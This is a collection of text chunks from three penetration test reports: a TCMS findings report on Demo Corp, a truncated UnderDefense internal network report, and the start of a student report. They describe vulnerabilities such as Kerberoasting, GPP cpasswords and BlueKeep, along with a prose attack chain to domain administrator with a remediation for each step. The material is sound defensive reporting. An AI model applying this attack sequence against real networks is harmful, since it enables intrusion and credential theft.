exists but did not attempt the exploit to prevent any denial of service. Risk: Likelihood: High – The vulnerability is easily discoverable and exploitable with open-source tools. Impact: Very High – If exploited, an attacker gains code execution as the system user. An adversary will require additional techniques to obtain domain administrator access. System: 10.x.x.x Tools Used: Nessus, Nmap References: NIST SP800-53 r4 MA-6 – Timely Maintenance NIST SP800-53 r4 SI-2 – Flaw Remediation Evidence Figure 13: Unpatched CVE-2019-0708 Remediation Apply the appropriate Microsoft patches to remediate the issue. More information on patching CVE- 2019-0708 can be found here: https://support.microsoft.com/en-us/topic/customer-guidance-for- cve-2019-0708-remote-desktop-services-remote-code-execution-vulnerability-may-14-2019- 0624e35b-5f5d-6da7-632c-27066a79262e Demo Corp BUSINESS CONFIDENTIAL Page 25 of 38\\nFinding IPT-014: Insufficient Privileged Account Management – Kerberoasting (High) Description: TCMS retrieved all user service principal names (SPNs) from the Demo Corp domain controller using a domain user-level account (IPT-001) in a Kerberoasting attack. Retrieving these user SPNs permitted TCMS to crack 4 account passwords. No service accounts were observed running as domain administrators. User accounts were observed running as a service, which is not best practice. Risk: Likelihood: High – Any account joined to the domain can request user SPNs. Impact: High – Using SPNs, it is possible to retrieve sensitive account password hashes and crack them offline. Tools Used: Impacket, Hashcat References: Kerberoasting details: https://adsecurity.org/?p=2293 Group Managed Service Accounts Overview Evidence Figure 14: Cracked service accounts Remediation Use Group Managed Service Accounts (GMSA) for privileged",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 10
    }
  },
  {
    "text": "can request user SPNs. Impact: High – Using SPNs, it is possible to retrieve sensitive account password hashes and crack them offline. Tools Used: Impacket, Hashcat References: Kerberoasting details: https://adsecurity.org/?p=2293 Group Managed Service Accounts Overview Evidence Figure 14: Cracked service accounts Remediation Use Group Managed Service Accounts (GMSA) for privileged services. GMSA accounts can be used to ensure passwords are long, complex, and change frequently. Where GMSA is not applicable, protect accounts by utilizing a password vaulting solution. TCMS recommends configuring alert logging on domain controllers for Windows event ID 4769 whenever requesting a Kerberos service ticket. These alerts are prone to high false-positive rates but are a supplementary detective control. Tailor a security information and event management tool (SIEM) to alert on excessive user SPN requests. Demo Corp BUSINESS CONFIDENTIAL Page 26 of 38\\nFinding IPT-015: Security Misconfiguration – GPP Credentials (High) Description: Demo Corp utilized “cpasswords” in Group Policy Preference (GPP) which any domain user can query from a domain controller’s SYSVOL folder. Microsoft published the key to decrypt these passwords. Risk: Likelihood: High – Any authenticated user can obtain this information and decrypt the password with open source tools. Impact: High – An adversary can use these credentials to move laterally within the network. Tools Used: Metasploit References: NIST SP800-53 IA-5(1) - Authenticator Management Evidence Figure 15: Dumped GPP credentials Remediation Apply vendor patching. Do not use GPP cpasswords. Additionally, enabling authentication on the NFS share will protect the confidentiality of the stored information. Exporting authentication logs to a SIEM solution will give incident response teams insights to brute force login attempts. Demo Corp BUSINESS CONFIDENTIAL Page 27 of 38\\nFinding IPT-016: Insufficient Authentication - VNC (High) Description: Demo Corp deployed 3 servers that permitted unauthenticated access via VNC Server. Risk: Likelihood: High – Discovering unauthenticated VNC servers is trivial and can be done with open-source tools. Impact: High – Attackers can control industrial devices, destroy data, or shut down systems. System: 10.x.x.x, 10.x.x.x, 10.x.x.x Tools Used: Nessus, VNC Viewer References: NIST SP800-53 IA-5(1) - Authenticator Management Evidence [image redacted] Figure 16: Access to system via VNC Remediation Enable authentication on the VNC Server. Demo Corp BUSINESS CONFIDENTIAL Page 28 of 38\\nFinding IPT-017: Default Credentials on Web Services (High) Description: TCMS validated default credentials worked on multiple web applications within the Demo Corp environment. Risk: Likelihood: High – Credentials are published for these devices and an attackers first authentication attempt. Impact: High – Attackers can control devices, destroy data, or shut down systems. System: Default credentials were tested on a sample set of web applications, but suggests checking the following addresses at a minimum: [file removed] Tools Used: Manual Review References: NIST SP800-53 IA-5(1) - Authenticator Management Evidence Figure 17: Dell iDRAC access via default credentials Remediation Change default credentials or disable unused accounts. Demo Corp BUSINESS CONFIDENTIAL Page 29 of 38\\nFinding IPT-018: Insufficient Hardening – Listable Directories (High) Description: Demo Corp disclosed information by allowing listable directories and storing potentially critical items on web server. It is strongly",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 11
    }
  },
  {
    "text": "17: Dell iDRAC access via default credentials Remediation Change default credentials or disable unused accounts. Demo Corp BUSINESS CONFIDENTIAL Page 29 of 38\\nFinding IPT-018: Insufficient Hardening – Listable Directories (High) Description: Demo Corp disclosed information by allowing listable directories and storing potentially critical items on web server. It is strongly recommended that Demo Corp perform a thorough web app assessment on this resource. Risk: Likelihood: Moderate – Adversaries will discovery content with open source tools. Impact: High – Attackers use this information in conjunction with other attacks for enumeration and cataloging for rapid attacks when vulnerabilities arise. System: Full list of discovered listable directories: [file removed] Tools Used: Manual Review References: NIST SP800-53r4 CM-7 - Least Functionality NIST SP800-53r4 AC-6(3) - Least Privilege Evidence Figure 18: Listable directory Remediation Restrict access and conduct web app assessment. Demo Corp BUSINESS CONFIDENTIAL Page 30 of 38\\nFinding IPT-019: Unauthenticated SMB Share Access (Moderate) Description: Demo Corp exposed multiple servers with unauthenticated file server access. Risk: Likelihood: Moderate – Adversaries will discover these shares with low-noise, basic reconnaissance techniques. Impact: Moderate – Attackers learn about the environment through information leaks. System: 10.x.x.x Tools Used: Nessus, smbclient References: NIST SP800-53r4 AC-6(3) - Least Privilege NIST SP800-53 r4 SC-4 - Information in Shared Resources Evidence Figure 19: Unauthenticated Share access Remediation Disable SMB share or require authentication. Enabling authentication on the share will protect the confidentiality of the stored information. Exporting authentication logs to a SIEM solution will give incident response teams insights to brute force login attempts. Demo Corp BUSINESS CONFIDENTIAL Page 31 of 38\\nFinding IPT-020: Insufficient Patch Management – SMBv1 (Moderate) Description: Demo Corp failed to patch SMBv1. This version is vulnerable to multiple denial of service and remote code execution attacks. TCM Security confirmed that the vulnerability likely exists but did not attempt the exploit to prevent any denial of service. Risk: Likelihood: Moderate – Basic scans would identify the SMB version but would require an adversary to be on the internal network and identify an exploit. Impact: Moderate – If exploited, an attacker gains denial of service and code execution capability. System: 10.x.x.x Tools Used: Nessus, Nmap References: https://blogs.technet.microsoft.com/filecab/2016/09/16/stop-using-smb1/ NIST SP800-53 r4 SI-2 - Flaw Remediation Evidence Figure 20: Unauthenticated Share access Remediation Upgrade to SMBv3 and apply latest patching. Demo Corp BUSINESS CONFIDENTIAL Page 32 of 38\\nFinding IPT-021: IPMI Hash Disclosure (Moderate) Description: Demo Corp deployed remote host supporting IPMI v2.0. The (IPMI) protocol is affected by an information disclosure vulnerability due to the support of RMCP+ Authenticated Key-Exchange Protocol (RAKP) authentication. A remote attacker can obtain password hash information for valid user accounts via the HMAC from a RAKP message 2 response from a BMC. Risk: Likelihood: High – Basic network scans will identify this vulnerability. Impact: Moderate – If exploited, an attacker can gain access to sensitive management devices. TCMS was unable to crack any hashes during the assessment. System: Identified 34 machines, please see the below file for listing. [file removed] Tools Used: Metasploit References: https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/ Evidence Figure",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 12
    }
  },
  {
    "text": "network scans will identify this vulnerability. Impact: Moderate – If exploited, an attacker can gain access to sensitive management devices. TCMS was unable to crack any hashes during the assessment. System: Identified 34 machines, please see the below file for listing. [file removed] Tools Used: Metasploit References: https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/ Evidence Figure 21: IPMI Hash Disclosure Remediation There is no patch for this vulnerability; it is an inherent problem with the specification for IPMI v2.0. Suggested mitigations include: • Disabling IPMI over LAN if it is not needed. • Using strong passwords to limit the successfulness of off-line dictionary attacks. • Using Access Control Lists (ACLs) or isolated networks to limit access to your IPMI management interfaces. Demo Corp BUSINESS CONFIDENTIAL Page 33 of 38\\nFinding IPT-022: Insufficient SNMP Community String Complexity (Moderate) Description: Demo Corp deployed SNMP with default “public” community strings. This configuration exposed read-only access to the system’s management information base (MIB), including the network configurations. Risk: Likelihood: High – Basic network scans will identify this vulnerability. Impact: Moderate – If exploited, an attacker can profile the device and focus attacks. System: Identified 45 machines, please see the below file for listing. [file removed] Tools Used: Nessus, SNMP-Check, Ettercap References: NIST SP800-53 r4 AC-17(2) - Remote Access Protection of Confidentiality/Integrity using Encryption Evidence Figure 22: Information disclosure via public SNMP community strings Figure 23: Non-public SNMP string captured via Ettercap Remediation TCM Security recommends Demo Corp consider the following corrective actions: • Disabled SNMP if not required • Filter UDP packets going to port UDP – 161 • Evaluate migration to SNMPv3 • Use password complexity guidelines for community strings Demo Corp BUSINESS CONFIDENTIAL Page 34 of 38\\nFinding IPT-023: Insufficient Data in Transit Encryption - Telnet (Moderate) Description: Demo Corp permitted Telnet which does not encrypt data in transit. Telnet uses plain text authentication and passes all data (including passwords) in clear text and can be intercepted by an attacker. Risk: Likelihood: Low – An adversary requires a Man-in-the-Middle position between the client and server. Impact: High – If exploited an adversary may intercept administrative credentials that can be used in other attacks. System: Identified 53 machines, please see the below file for listing. [file removed] Tools Used: Telnet References: NIST SP800-53 r4 AC-17(2) - Remote Access |Protection of Confidentiality / Integrity Using Encryption Evidence Figure 24: Telnet login prompt Remediation Migrate to TLS protected protocols. Demo Corp BUSINESS CONFIDENTIAL Page 35 of 38\\nFinding IPT-024: Insufficient Terminal Services Configuration (Moderate) Description: The remote Terminal Services is not configured to use Network Level Authentication (NLA) only. NLA uses the Credential Security Support Provider (CredSSP) protocol to perform strong server authentication either through TLS/SSL or Kerberos mechanisms, which protect against man-in-the-middle attacks. In addition to improving authentication, NLA also helps protect the remote computer from malicious users and software by completing user authentication before a full RDP connection is established. Risk: Likelihood: Low – An attacker can discover these vulnerabilities with basic tools. Impact: High – If exploited, an adversary gains code",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 13
    }
  },
  {
    "text": "In addition to improving authentication, NLA also helps protect the remote computer from malicious users and software by completing user authentication before a full RDP connection is established. Risk: Likelihood: Low – An attacker can discover these vulnerabilities with basic tools. Impact: High – If exploited, an adversary gains code execution, leading to lateral movement across the network. System: Identified 118 machines, please see the below file for listing. [file removed] Tools Used: Nessus References: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server- 2008-R2-and-2008/cc732713(v=ws.11) Remediation Enable Network Level Authentication (NLA) on the remote RDP server. This is generally done on the 'Remote' tab of the 'System' settings on Windows. Demo Corp BUSINESS CONFIDENTIAL Page 36 of 38\\nFinding IPT-025: Steps to Domain Admin (Informational) The steps below describe how the penetration tester obtained domain administrator access. Each step also provides remediation recommendations to help mitigate risk. Step Action Remediation 1 Poisoned LLMNR responses to obtain NetNTLMv2 Disable multicast name resolution hash of regular network user via GPO. 2 Cracked NTLM hash offline of domain Increase password complexity. administrator users ‘production’ and ‘[name Utilize multi- removed]’ factor. Implement a Privileged Account Management solution. Utilize a password filter. 3 Leveraged password of ‘production’ account to gain Limit local administrator privileges access to several machines within the network and enforce least privilege. 4 Dumped hashes on accessed machines to find Disable WDigest via GPO. cleartext password of ‘Bartender’ account via wdigest 5 Overly-permissive ‘Bartender’ account permitted Limit local administrator privileges access to a large amount of machines within the and enforce least privilege. network 6 Dumped hashes on accessed machines to find Disable WDigest via GPO. cleartext password of Domain Administrator account 7 Utilized discovered credentials to log into the domain controller. Remediation Review action and remediation steps. Additional Scans and Reports TCMS provides all clients with all report information gathered during testing. This includes Nessus files and full vulnerability scans in detailed formats. These reports contain raw vulnerability scans and additional vulnerabilities not exploited by TCM Security. The reports identify hygiene issues needing attention but are less likely to lead to a breach, i.e. defense-in-depth opportunities. For more information, please see the documents in your shared drive folder labeled “Additional Scans and Reports”. Demo Corp BUSINESS CONFIDENTIAL Page 37 of 38\\nLast Page Demo Corp BUSINESS CONFIDENTIAL Page 38 of 38",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 14
    }
  },
  {
    "text": "STUDY Internal penetration testing report [Anonymized] Please be informed that this is an incomplete version of Get full report the UnderDefense Internal Penetration Testing Report\\n1 Table of contents Table Of Contents 1 Executive Summary 3 1.1 Project Objectives 4 1.2 Scope, Timeframe and Limitations 5 1.3 Summary of Findings 6 1.4 Summary of Business Risks 7 1.5 High-Level Recommendations 10 Project Disclaimer 15 2.1 Methodology 15 2.2 Security tools used 15 2.3 Project limitations 15 Findings Details 16 3.1 Critical severity findings in Internal Network 16 3.1.1 Link-Local Multicast Name Resolution (LLMNR) protocol poisoning leads to Man- In-The-Middle attack 16 3.1.2 Log4j Remote Code Execution 18 3.1.3 Microsoft MS17-010 EternalBlue 21 3.1.4 Microsoft RDP RCE CVE-2019-0708 BlueKeep 22 3.1.5 Unauthenticated access to network devices 23 3.1.6 Privilege escalation via ADCS relay 25 3.1.7 noPac Privilege escalation (CVE-2021-42287, CVE-2021-42278) 28 3.1.8 Dynamic DNS update on zone [NETWORK_ENDPOINT] 30 3.1.9 ManageEngine ADManager Plus Remote Command Execution 31 3.2 High severity findings 35 3.2.1 SMBv1 is enabled on Domain Controllers 35 3.2.2 Kerberoastable Privileged Users 36 3.2.3 Weak Password usage in domain environment 38 3.2.4 NTLMv1, and old LM protocols are enabled 39 3.2.5 Unsupported Windows Version 40 3.2.6 Unsupported Unix Version 42 3.2.7 Unsupported MSSQL Version 43 3.2.8 Unsupported Oracle DB Software Version 44 3.2.9 Unsupported Software Version 45 3.3 Medium severity findings 46 3.3.1 Unprivileged share access - Access to sensitive data 46 3.3.2 SMB Signing not required 49 3.3.3 Microsoft Windows RDP MitM Weakness 51 Please be informed that this is an incomplete version of the UnderDefense Internal Penetration Testing Report. If you're interested in accessing the comprehensive version, kindly follow the link provided below. Get full report\\n2 3.3.4 SNMP public community string 52 3.3.5 Privileged accounts with ACCOUNT_DOES_NOT_EXPIRE Flag 55 3.3.6 Leaked password in GPO 57 3.3.7 Apache Tomcat AJP Connector Request Injection (Ghostcat) 59 3.4 Low severity findings 61 3.4.1 Terminal Services Doesn't Use Network Level Authentication (NLA) Only 61 3.4.2 MongoDB Service Without Authentication Detection 63 3.4.3 [CVE-2010-1429] JBoss — Sensitive Information Disclosure 65 3.4.4 PostgreSQL Default Unpassworded Account 67 SAP Findings Details 68 4.1 Medium severity findings 68 4.1.1 SAP BusinessObjects Business Intelligence Platform SSRF Vulnerability 68 4.2 Low severity findings 70 4.2.1 SAP Internet Communication Framework (ICF) info disclosure 70 4.2.2 Unauthenticated NFS Share Access 73 4.2.3 SOAP interface Information Disclosure 75 4.3 Informational severity findings 78 4.3.1 Insecure HTTP Communication in SAP Web Applications 78 Wi-Fi Testing 80 Pacon Network 81 WiFi Handshake Capture 81 PMKID capture 82 Annonay Network 83 EAP methods of authentication 83 Evil-Twin Attack 84 Appendix A: MITRE ATT&CK mapping on Internal Network Findings 85 Please be informed that this is an incomplete version of the UnderDefense Internal Penetration Testing Report. If you're interested in accessing the comprehensive version, kindly follow the link provided below. Get full report\\n3 Executive Summary This report presents the results of the “Gray Box” penetration testing for the [CLIENT_NAME] internal network perimeter. The recommendations provided in this report are structured to facilitate remediation of the",
    "metadata": {
      "doc_id": "UnderDefense Internal Penetration Testing Report",
      "chunk_id": 0
    }
  },
  {
    "text": "Report. If you're interested in accessing the comprehensive version, kindly follow the link provided below. Get full report\\n3 Executive Summary This report presents the results of the “Gray Box” penetration testing for the [CLIENT_NAME] internal network perimeter. The recommendations provided in this report are structured to facilitate remediation of the identified security risks. This document serves as a formal letter of attestation for the recent [CLIENT_NAME] “Gray Box” internal network penetration testing. Evaluation ratings compare information gathered during the engagement to “best in class” criteria for security standards. We believe that the statements made in this document provide an accurate assessment of the [CLIENT_NAME]’s current security. We highly recommend reviewing the Summary section of business risks and High-Level Recommendations for a better understanding of risks and discovered security issues. Scope of assessment Security Level Grade Internal Network Perimeter F Unacceptable Wireless Network Perimeter A Excellent Grade Security Criteria Description The security exceeds “Industry Best Practice” standards. The overall AA Excellent posture was found to be excellent with only a few low-risk findings identified. The security meets accepted standards for “Industry Best Practice.” B Good The overall posture was found to be strong with only a handful of medium- and low-risk shortcomings identified. Current solutions protect some areas of the enterprise from security B Fair issues. Moderate changes are required to elevate the discussed areas to “Industry Best Practice” standards Significant security deficiencies exist. Immediate attention should be D Poor given to the discussed issues to address exposures identified. Major changes are required to elevate to “Industry Best Practice” standards. Serious security deficiencies exist. Shortcomings were identified F Unacceptable throughout most or even all of the security controls examined. Improving security will require a major allocation of resources. Please be informed that this is an incomplete version of the UnderDefense Internal Penetration Testing Report. If you're interested in accessing the comprehensive version, kindly follow the link provided below. Get full report\\n4 1.1 Project Objectives Our primary goal within this project was to provide the [CLIENT_NAME] with an understanding of the current level of security in the internal network and its infrastructure components. We completed the following objectives to accomplish this goal Identify risks that organizations could be victim of ransomware attac Confirmed: Critical severity risk caused by multiple outdated vulnerable business-critical IT system Identifying network-based threats to and vulnerabilities in the Active Director Confirmed: Critical security controls are not in place to meet best practices and protect organizations from instant malware attacks Check for Cyber hygiene Confirmed: Critical security controls such as Regular Software Patching & Updates, Strong Password Management, Regular Security Monitoring & Auditing, Network Segmentation based on Zero Trust principal Comparing [CLIENT_NAME] current security measures with industry best practices Does not meet: Regular Patching and Updates: Ensure that all software, including operating systems, applications, and security tools, are regularly patched and updated with the latest security patches and updates to address known vulnerabilities and weaknesses Strong Authentication and Access Controls: Enforce the use of strong, unique passwords for all",
    "metadata": {
      "doc_id": "UnderDefense Internal Penetration Testing Report",
      "chunk_id": 1
    }
  },
  {
    "text": "Does not meet: Regular Patching and Updates: Ensure that all software, including operating systems, applications, and security tools, are regularly patched and updated with the latest security patches and updates to address known vulnerabilities and weaknesses Strong Authentication and Access Controls: Enforce the use of strong, unique passwords for all user accounts, implement multi-factor authentication (MFA) wherever possible, and restrict user access permissions based on the principle of least privilege to limit potential exposure to unauthorized access Incident Response Plan: Develop and maintain an incident response plan that outlines roles and responsibilities, communication protocols, and steps to mitigate and recover from security incidents. Regularly review and update the plan to reflect changes in the threat landscape and organizational environment Threat Hunt & Threat Intelligence Monitoring: Implement continuous monitoring of corporate data, domains and user’s to detect and respond to potential security incidents, such as fraudulent activities, data breaches and leakage, or compromised user’s data such as emails, passwords, etc. Partially meet: Secure Network Architecture: Implement a secure network architecture that includes network segmentation, firewalls, and intrusion detection/prevention systems (IDPS) to isolate critical systems and data from potential threats and control access to sensitive information Compliance with Industry Standards: Ensure compliance with relevant industry standards, regulations, and frameworks, such as the General Data Protection Regulation (GDPR), Payment Card Industry Data Security Standard (PCI DSS), National Institute of Standards and Technology Please be informed that this is an incomplete version of the UnderDefense Internal Penetration Testing Report. If you're interested in accessing the comprehensive version, kindly follow the link provided below. Get full report\\n5 (NIST) Cybersecurity Framework, and others applicable to the art materials and related products industry. Meets best practices: Backup and Disaster Recovery: Regularly back up critical data and establish a robust disaster recovery plan to ensure that data can be restored in the event of a cybersecurity incident or data loss Secure Remote Access: Implement secure remote access mechanisms, such as virtual private networks (VPNs) or secure remote desktop protocols, with strong authentication and access controls to protect against unauthorized access to the organization's networks and systems. Providing recommendations that [CLIENT_NAME] can implement to mitigate threats and vulnerabilities and meet industry best practice Completed: recommendations were provided in section “1.5 High-Level Recommendations” 1.2 Scope, Timeframe and Limitations Testing and verification were performed between [DATE]. The scope of this project was limited to the [CLIENT_NAME] internal network. We conducted the tests using a production version of the [CLIENT_NAME] internal network. All other servers were out of scope. All testing and verification were conducted from outside of [CLIENT_NAME] offices. User Accounts provided by [CLIENT_NAME] The following hosts were considered to be in scope for testing. Scope Description Internal Network Scope [NETWORK_SCOPE] Network Devices Scope [NETWORK_DEVICES_SCOPE] WiFi Testing Scope [WIFI_SCOPE] Limitations This security assessment was conducted for [CLIENT_NAME] production environment and valid on the date of the report submission hereto. The description of findings, recommendations, and risks was valid on the date of submission the report hereto. Any projection to the future",
    "metadata": {
      "doc_id": "UnderDefense Internal Penetration Testing Report",
      "chunk_id": 2
    }
  },
  {
    "text": "Network Devices Scope [NETWORK_DEVICES_SCOPE] WiFi Testing Scope [WIFI_SCOPE] Limitations This security assessment was conducted for [CLIENT_NAME] production environment and valid on the date of the report submission hereto. The description of findings, recommendations, and risks was valid on the date of submission the report hereto. Any projection to the future of the report’s information is subject to risk due to changes in the Infrastructure architecture, and it may no longer reflect its logic and controls. Please be informed that this is an incomplete version of the UnderDefense Internal Penetration Testing Report. If you're interested in accessing the comprehensive version, kindly follow the link provided below. Get full report\\n6 1.3 Summary of Findings Our assessment of the [CLIENT_NAME] internal network revealed the following vulnerabilities: Vulnerabilities by severity 5 35 37 94 201 Critical High Medium Low Informational Security experts performed security testing, which demonstrates the following results Severity Critical High Medium Low Informational Number of issues by 35 37 201 94 5 types Please be informed that this is an incomplete version of the UnderDefense Internal Penetration Testing Report. If you're interested in accessing the comprehensive version, kindly follow the link provided below. Get full report\\n7 Severity scoring: Critical – Immediate threat to key business processes High – Direct threat to key business processes. Medium – Indirect threat to key business processes or partial threat to business processes. Low – No direct threat exists. The vulnerability may be exploited using other vulnerabilities. Informational – This finding does not indicate vulnerability, but states a comment that notifies about design flaws and improper implementation that might cause a problem in the long run The exploitation of found vulnerabilities may cause full compromise of some services, stealing users’ accounts, and gaining organizations’ and users’ sensitive information. 1.4 Summary of Business Risks Business Risks Security controls Operational Regulatory Damage to End User Data Disruption Compliance Reputation Disruption Insecure Network Direct impact Direct impact Direct impact Direct impact Architecture Lack of Patching and Direct impact High risk High risk Direct impact Software Updates Lack of Security Monitoring 35 Direct impact Direct impact Direct impact Human Related Risks High risk High risk High risk Direct impact Financial Loss: If a business's cybersecurity is breached, it can result in financial losses due to theft, fraud, or the cost of remedying the issue. This can include direct costs such as fines, legal fees, and compensation, as well as indirect costs such as reputational damage, loss of customer trust, and loss of revenue. Operational Disruption: If a business's systems are compromised, it can disrupt their operations, leading to downtime, loss of productivity, and inability to provide services to customers. This can also result in reputational damage, as customers may become frustrated with the lack of service. Based on $750M of company’s revenue in 2022 business interruption possesses the risk of $2,054,794 direct losses per day, or 85K per hour (within 24h frame). Please be informed that this is an incomplete version of the UnderDefense Internal Penetration Testing Report. If you're",
    "metadata": {
      "doc_id": "UnderDefense Internal Penetration Testing Report",
      "chunk_id": 3
    }
  },
  {
    "text": "frustrated with the lack of service. Based on $750M of company’s revenue in 2022 business interruption possesses the risk of $2,054,794 direct losses per day, or 85K per hour (within 24h frame). Please be informed that this is an incomplete version of the UnderDefense Internal Penetration Testing Report. If you're interested in accessing the comprehensive version, kindly follow the link provided below. Get full report\\n8 Regulatory Compliance: Depending on the industry, businesses may be subject to various regulatory requirements related to cybersecurity. If they fail to comply with these requirements, they may face penalties or fines. Average GDPR fine for a company in 2022 is $1,758,382 in Europe. Data Breaches: A cybersecurity vulnerability can lead to data breaches, which can result in sensitive information being exposed or stolen. This can include personal information of customers or employees, financial information, trade secrets, and other confidential information. Data breaches can result in significant legal and financial consequences, as well as reputational damage. From 2.5% to 5% of world’s trade is counterfeit products, resulting in possible $18,790,00 revenue losses in case of intellectual property theft. Damage to Reputation: A cybersecurity breach can damage a business's reputation, especially if sensitive information is exposed. Customers may lose trust in the business, which can result in a loss of revenue and difficulty in acquiring new customers. According to IBM's Cost of a Data Breach 2022 report, a single data breach on a company cost an average of $9,440,000 in the U.S. in 2022 Critical severity issues can lead to severe financial losses caused by operational disruption, data breach involving personal and financial information and / or regulatory compliance: Disruption or stoppage of business operations, especially considering that critical systems and data are compromised. This can lead to decreased productivity, revenue loss, and reputational damage. Based on $751.6M of company’s revenue in 2022 business interruption possess the risk of $20M direct losses per da Unauthorized access to sensitive data, including personal (PII) and financial information. Compromise of customers’ systems and leakage of sensitive customer data can result in the loss of customer trust and financial loss. Average GDPR fine for a company in 2022 is $1,758,382 in Europe. The Industry and Commerce sector lead the list by total number of fines - 369 companies were charged. Legal liability for damages resulting from a successful attack, such as financial losses suffered by customers or partners. Theft of intellectual property such as trade secrets or proprietary information. This can lead to a loss of competitive advantage and damage to the business's reputation. 2.5% to 5% of world’s trade is counterfeit products, resulting in possible $18,790,00 revenue losses in case of intellectual property theft. High severity issues can lead to full or partial operational disruption. If a business's systems are compromised, it can disrupt their operations, leading to downtime, loss of productivity, and inability to provide services to customers. This can also result in reputational damage, as customers may become frustrated with the lack of service: Persisting in the internal",
    "metadata": {
      "doc_id": "UnderDefense Internal Penetration Testing Report",
      "chunk_id": 4
    }
  },
  {
    "text": "full or partial operational disruption. If a business's systems are compromised, it can disrupt their operations, leading to downtime, loss of productivity, and inability to provide services to customers. This can also result in reputational damage, as customers may become frustrated with the lack of service: Persisting in the internal network for a long time because of using domain accounts without password expiration. This means malicious actors can stay in your network as long as they need to and wait for the best time to strike. Please be informed that this is an incomplete version of the UnderDefense Internal Penetration Testing Report. If you're interested in accessing the comprehensive version, kindly follow the link provided below. Get full report\\n9 Brute forcing users’ passwords. Gaining the access to user’s session literally breaking them using various automated tools Outdated software versions often have a large number of CVEs and associated exploits, which can result in numerous vulnerabilities. These vulnerabilities can pose significant security risks, potentially leading to unauthorized access to sensitive information, data breaches, and reputational damage for the business. 60% of cybersecurity breaches happen due to unpatched vulnerabilities. Medium severity issues can lead to reputational damages. A cybersecurity breach can damage a business's reputation, especially if sensitive information is exposed. Customers may lose trust in the business, which can result in a loss of revenue and difficulty in acquiring new customers: Unauthorized access to different resources can potentially cause sensitive data exposures and reputational losses because of the leakage of documents that belong to certain employees and [CLIENT_NAME] clients Based on current security controls implemented, malicious actors are able to gain a large amount of information about the SNMP server and the network it monitors. This helps to prepare and plan successful attacks. An average period of time malicious actors stay undetected in the companies network is 280. Obtaining credentials or other sensitive information and to modify traffic exchanged between a client and server. Low and Informational severity issues can lead to: Provide additional internal information that can be used by threat actors for successful attacks on a platform such as a Remote Command Execution, Denial of Service, Directory Traversal etc Theft of database accesses leading to unauthorized access to sensitive data, such as user credentials and transaction records. This can result in reputational damage, loss of customer trust, and legal and regulatory implications Could be chained with other vulnerabilities to increase potential impact. Please be informed that this is an incomplete version of the UnderDefense Internal Penetration Testing Report If you're interested in accessing the comprehensive version, kindly follow the link provided below. Get full report +1 929 999 5101 Please be informed that you currently have an incomplete version of the UnderDefense Web Penetration Testing Report. If you're interested in accessing the comprehensive version, kindly follow the link provided below. Get full report",
    "metadata": {
      "doc_id": "UnderDefense Internal Penetration Testing Report",
      "chunk_id": 5
    }
  },
  {
    "text": "of the UnderDefense Web Penetration Testing Report. If you're interested in accessing the comprehensive version, kindly follow the link provided below. Get full report",
    "metadata": {
      "doc_id": "UnderDefense Internal Penetration Testing Report",
      "chunk_id": 6
    }
  },
  {
    "text": "Penetration Test Report Conducted by: New Haven Hacking Inc. Team Members Email Samuel Zurowski szuro1@unh.newhaven.edu Charles Barone cbaro4@unh.newhaven.edu March 3, 2022 NOTICE: The information provided in this document is CONFIDENTIAL and is intended only for AEC\\nTable of Contents 1 Report Overview 2 1.1 Executive Summary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2 1.2 Engagement Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3 1.3 Scope of Engagement . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3 2 Observations 4 2.1 Summary of Recommendations . . . . . . . . . . . . . . . . . . . . . . . . . 5 2.2 Positive Security Measures . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5 2.3 Compliance . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6 2.3.1 PCI DSS Violations . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6 3 Testing Methodology 7 3.1 Penetration Testing Execution Standard . . . . . . . . . . . . . . . . . . . . 7 3.2 MITRE ATT&CK Framework . . . . . . . . . . . . . . . . . . . . . . . . . . 7 3.3 OWASP Top 10 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7 3.4 PCI DSS Auditing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7 3.5 NIST SP 800-53 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8 4 Technical Findings 9 4.1 Critical Risk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "University of New Haven - Penetration Test Report",
      "chunk_id": 0
    }
  },
  {
    "text": ". . . . . . . . . . . 8 4 Technical Findings 9 4.1 Critical Risk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10 4.1.1 Lack Of PostgreSQL Authentication . . . . . . . . . . . . . . . . . . 10 4.2 High Risk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12 4.2.1 Lack of MariaDB Authentication . . . . . . . . . . . . . . . . . . . . 12 4.3 Moderate Risk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15 4.3.1 Payment Transaction Enumeration . . . . . . . . . . . . . . . . . . . 15 4.4 Low Risk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17 4.4.1 ScadaBR Reflected XSS (Username) . . . . . . . . . . . . . . . . . . 17 4.5 Informational . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19 4.5.1 Insufficient Firewalls . . . . . . . . . . . . . . . . . . . . . . . . . . . 19 5 Conclusion 20 Appendices 22 A Network Topology 22 B Tools 23 Page 1\\n1 Report Overview 1.1 Executive Summary New Haven Hacking Inc. was contacted by An Example Company (AEC) for a penetration test in order to identify security issues within their infrastructure. This report was written initially on January 7th and submitted on January 9th at 1:00AM. This penetration test is in the interest of AEC, as part of a restrained scope penetration test and risk assessment. The Report Overview section contains an outlined summary of New Haven Hacking Inc.’s find- ings, including recommendations for improving AEC’s security, mitigating potential business risk, and reducing attack surface. The Technical Findings section expands upon the report 